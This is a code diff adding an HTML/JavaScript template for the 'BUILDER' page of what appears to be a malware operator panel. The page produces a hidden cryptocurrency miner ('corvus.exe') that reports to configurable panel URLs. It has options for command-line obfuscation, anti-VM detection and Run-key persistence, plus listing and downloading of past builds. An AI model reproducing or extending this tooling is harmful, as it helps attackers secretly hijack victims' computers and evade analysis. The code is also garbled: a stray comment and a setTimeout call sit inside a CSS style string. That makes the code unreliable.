@@ -1,0 +1,333 @@
+{{define "content"}}
+<div class="builder-page">
+    <h2 style="color: #aa0000; letter-spacing: 2px; margin-bottom: 15px;">BUILDER</h2>
+
+    <div style="max-width: 1200px;">
+        <div class="builder-section" style="background-color: #262626; border: 2px solid #440000; padding: 20px; margin-bottom: 20px;">
+            <h3 style="color: #aa0000; font-size: 1em; margin-bottom: 15px; letter-spacing: 1px;">BUILD CONFIGURATION</h3>
+            
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label style="color: #b3b3b3; display: block; margin-bottom: 5px;">Panel URL(s) (comma-separated for fallback):</label>
+                <input type="text" id="panelUrls" placeholder="http://panel1.com/api/miners/submit,http://panel2.com/api/miners/submit" style="
+                    width: 100%;
+                    padding: 8px;
+                    background-color: #1a1a1a;
+                    color: #b3b3b3;
+                    border: 2px solid #440000;
+                    font-family: 'Ubuntu Mono', monospace;
+                    font-size: 0.9em;
+                ">
+                <small style="color: #888; font-size: 0.85em;">Enter one or more panel URLs separated by commas for fallback support</small>
+            </div>
+
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label style="color: #b3b3b3; display: flex; align-items: center; cursor: pointer;">
+                    <input type="checkbox" id="processMonitoring" style="margin-right: 8px; cursor: pointer;">
+                    Enable Process Monitoring & Command-line Obfuscation
+                </label>
+            </div>
+
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label style="color: #b3b3b3; display: flex; align-items: center; cursor: pointer;">
+                    <input type="checkbox" id="debugConsole" style="margin-right: 8px; cursor: pointer;">
+                    Enable Debug Console
+                </label>
+            </div>
+
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label style="color: #b3b3b3; display: flex; align-items: center; cursor: pointer;">
+                    <input type="checkbox" id="antiVM" style="margin-right: 8px; cursor: pointer;">
+                    Enable Anti-VM Detection
+                </label>
+            </div>
+
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label style="color: #b3b3b3; display: flex; align-items: center; cursor: pointer;">
+                    <input type="checkbox" id="persistence" style="margin-right: 8px; cursor: pointer;">
+                    Enable Persistence (Run Key)
+                </label>
+            </div>
+
+            <div style="margin-top: 20px;">
+                <button onclick="startBuild()" id="buildButton" style="
+                    background-color: #aa0000;
+                    color: white;
+                    border: 2px solid #aa0000;
+                    padding: 10px 25px;
+                    font-size: 0.95em;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-family: 'Ubuntu Mono', monospace;
+                    transition: all 0.3s;
+                    letter-spacing: 1px;
+                " onmouseover="this.style.backgroundColor='transparent'; this.style.color='#aa0000';" 
+                   onmouseout="this.style.backgroundColor='#aa0000'; this.style.color='white';">
+                    BUILD MINER
+                </button>
+            </div>
+
+            <div id="buildStatus" style="margin-top: 15px; display: none;">
+                <div style="background-color: #1a1a1a; border: 2px solid #440000; padding: 15px;">
+                    <p id="buildStatusText" style="color: #b3b3b3; margin: 0; font-family: 'Ubuntu Mono', monospace; font-size: 0.9em;"></p>
+                    <div id="buildProgress" style="width: 100%; height: 4px; background-color: #333; margin-top: 10px; display: none;">
+                        <div id="buildProgressBar" style="width: 0%; height: 100%; background-color: #aa0000; transition: width 0.3s;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="buildLog" style="margin-top: 15px; display: none;">
+                <h4 style="color: #aa0000; font-size: 0.9em; margin-bottom: 8px;">BUILD LOG:</h4>
+                <pre id="buildLogContent" style="
+                    background-color: #1a1a1a;
+                    border: 2px solid #440000;
+                    padding: 10px;
+                    color: #b3b3b3;
+                    font-family: 'Ubuntu Mono', monospace;
+                    font-size: 0.8em;
+                    max-height: 300px;
+                    overflow-y: auto;
+                    white-space: pre-wrap;
+                    word-wrap: break-word;
+                "></pre>
+            </div>
+        </div>
+
+        <!-- Built Miners Section -->
+        <div class="builder-section" style="background-color: #262626; border: 2px solid #440000; padding: 20px; margin-top: 20px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h3 style="color: #aa0000; font-size: 1em; margin: 0; letter-spacing: 1px;">BUILT MINERS</h3>
+                <button onclick="loadBuilds()" style="
+                    background-color: transparent;
+                    color: #aa0000;
+                    border: 2px solid #aa0000;
+                    padding: 5px 15px;
+                    font-size: 0.85em;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-family: 'Ubuntu Mono', monospace;
+                    transition: all 0.3s;
+                    letter-spacing: 1px;
+                " onmouseover="this.style.backgroundColor='#aa0000'; this.style.color='white';" 
+                   onmouseout="this.style.backgroundColor='transparent'; this.style.color='#aa0000';">
+                    REFRESH
+                </button>
+            </div>
+
+            <div id="buildsListContainer" style="background-color: #1a1a1a; border: 2px solid #440000; padding: 10px;">
+                <div id="buildsList" style="color: #b3b3b3; font-family: 'Ubuntu Mono', monospace; font-size: 0.85em;">
+                    Loading builds...
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// Load builds on page load
+document.addEventListener('DOMContentLoaded', function() {
+    loadBuilds();
+});
+
+function loadBuilds() {
+    fetch('/api/builder/list')
+        .then(response => response.json())
+        .then(builds => {
+            const buildsList = document.getElementById('buildsList');
+            
+            if (!builds || builds.length === 0) {
+                buildsList.innerHTML = '<p style="margin: 5px 0; color: #888;">No builds found</p>';
+                return;
+            }
+
+            let html = '<table style="width: 100%; border-collapse: collapse;">';
+            html += '<thead><tr style="border-bottom: 1px solid #440000;">';
+            html += '<th style="text-align: left; padding: 8px; color: #aa0000;">Filename</th>';
+            html += '<th style="text-align: left; padding: 8px; color: #aa0000;">Size</th>';
+            html += '<th style="text-align: left; padding: 8px; color: #aa0000;">Modified</th>';
+            html += '<th style="text-align: center; padding: 8px; color: #aa0000;">Actions</th>';
+            html += '</tr></thead><tbody>';
+
+            builds.forEach(build => {
+                const size = formatBytes(build.size);
+                const date = new Date(build.modified_time).toLocaleString();
+                
+                html += '<tr style="border-bottom: 1px solid #333;">';
+                html += `<td style="padding: 8px;">${build.name}</td>`;
+                html += `<td style="padding: 8px;">${size}</td>`;
+                html += `<td style="padding: 8px;">${date}</td>`;
+                html += '<td style="padding: 8px; text-align: center;">';
+                html += `<button onclick="downloadBuild('${build.name}')" style="
+                    background-color: transparent;
+                    color: #00aa55;
+                    border: 1px solid #00aa55;
+                    padding: 3px 10px;
+                    font-size: 0.8em;
+                    cursor: pointer;
+        
+        // Refresh builds list
+        setTimeout(() => loadBuilds(), 1000);
+                    margin-right: 5px;
+                    font-family: 'Ubuntu Mono', monospace;
+                    transition: all 0.2s;
+                " onmouseover="this.style.backgroundColor='#00aa55'; this.style.color='white';" 
+                   onmouseout="this.style.backgroundColor='transparent'; this.style.color='#00aa55';">
+                    DOWNLOAD
+                </button>`;
+                html += `<button onclick="deleteBuild('${build.name}')" style="
+                    background-color: transparent;
+                    color: #aa3333;
+                    border: 1px solid #aa3333;
+                    padding: 3px 10px;
+                    font-size: 0.8em;
+                    cursor: pointer;
+                    font-family: 'Ubuntu Mono', monospace;
+                    transition: all 0.2s;
+                " onmouseover="this.style.backgroundColor='#aa3333'; this.style.color='white';" 
+                   onmouseout="this.style.backgroundColor='transparent'; this.style.color='#aa3333';">
+                    DELETE
+                </button>`;
+                html += '</td></tr>';
+            });
+
+            html += '</tbody></table>';
+            buildsList.innerHTML = html;
+        })
+        .catch(error => {
+            document.getElementById('buildsList').innerHTML = 
+                '<p style="margin: 5px 0; color: #aa3333;">Error loading builds: ' + error.message + '</p>';
+        });
+}
+
+function formatBytes(bytes) {
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+}
+
+function downloadBuild(filename) {
+    window.location.href = '/static/builds/' + filename;
+}
+
+function deleteBuild(filename) {
+    if (!confirm(`Are you sure you want to delete ${filename}?`)) {
+        return;
+    }
+
+    fetch('/api/builder/delete', {
+        method: 'DELETE',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ filename: filename })
+    })
+    .then(response => {
+        if (!response.ok) {
+            return response.json().then(err => {
+                throw new Error(err.error || 'Delete failed');
+            });
+        }
+        return response.json();
+    })
+    .then(result => {
+        // Reload the builds list
+        loadBuilds();
+    })
+    .catch(error => {
+        alert('Error deleting file: ' + error.message);
+    });
+}
+
+function startBuild() {
+    const panelUrls = document.getElementById('panelUrls').value.trim();
+    
+    if (!panelUrls) {
+        alert('Please enter at least one panel URL');
+        return;
+    }
+
+    const buildConfig = {
+        panel_urls: panelUrls,
+        process_monitoring: document.getElementById('processMonitoring').checked,
+        debug_console: document.getElementById('debugConsole').checked,
+        anti_vm: document.getElementById('antiVM').checked,
+        persistence: document.getElementById('persistence').checked
+    };
+
+    const buildButton = document.getElementById('buildButton');
+    const buildStatus = document.getElementById('buildStatus');
+    const buildStatusText = document.getElementById('buildStatusText');
+    const buildProgress = document.getElementById('buildProgress');
+    const buildLog = document.getElementById('buildLog');
+    const buildLogContent = document.getElementById('buildLogContent');
+
+    // Disable button and show status
+    buildButton.disabled = true;
+    buildButton.textContent = 'BUILDING...';
+    buildStatus.style.display = 'block';
+    buildProgress.style.display = 'block';
+    buildLog.style.display = 'block';
+    buildStatusText.textContent = 'Starting build process...';
+    buildStatusText.style.color = '#ffaa00';
+    buildLogContent.textContent = '';
+
+    // Send build request
+    fetch('/api/builder/build', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(buildConfig)
+    })
+    .then(response => {
+        if (!response.ok) {
+            return response.json().then(err => {
+                throw new Error(err.error || 'Build failed');
+            });
+        }
+        return response.blob();
+    })
+    .then(blob => {
+        // Create download link
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'corvus.exe';
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+
+        // Update status
+        buildStatusText.textContent = 'Build completed successfully! Download started.';
+        buildStatusText.style.color = '#00aa55';
+        document.getElementById('buildProgressBar').style.width = '100%';
+        
+        // Re-enable button
+        buildButton.disabled = false;
+        buildButton.textContent = 'BUILD MINER';
+    })
+    .catch(error => {
+        buildStatusText.textContent = 'Build failed: ' + error.message;
+        buildStatusText.style.color = '#aa3333';
+        buildLogContent.textContent += '\nERROR: ' + error.message;
+        
+        // Re-enable button
+        buildButton.disabled = false;
+        buildButton.textContent = 'BUILD MINER';
+    });
+
+    // Simulate progress (in real implementation, you'd use WebSocket for real-time updates)
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+        if (progress < 90) {
+            progress += Math.random() * 10;
+            document.getElementById('buildProgressBar').style.width = Math.min(progress, 90) + '%';
+        }
+    }, 500);
+
+    setTimeout(() => clearInterval(progressInterval), 30000);
+}
+</script>
+{{end}}
